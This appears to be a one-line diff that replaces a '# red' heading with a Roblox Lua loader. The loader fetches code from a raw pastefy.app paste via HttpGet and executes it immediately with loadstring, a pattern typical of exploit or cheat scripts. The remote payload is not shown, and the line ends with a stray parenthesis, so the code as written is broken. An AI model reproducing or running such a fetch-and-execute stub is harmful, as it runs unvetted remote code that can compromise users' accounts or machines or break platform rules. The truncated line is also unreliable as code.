@@ -1,1 +1,1 @@
-# red
+loadstring(game:HttpGet("https://pastefy.app/e22BnW8k/raw"))(
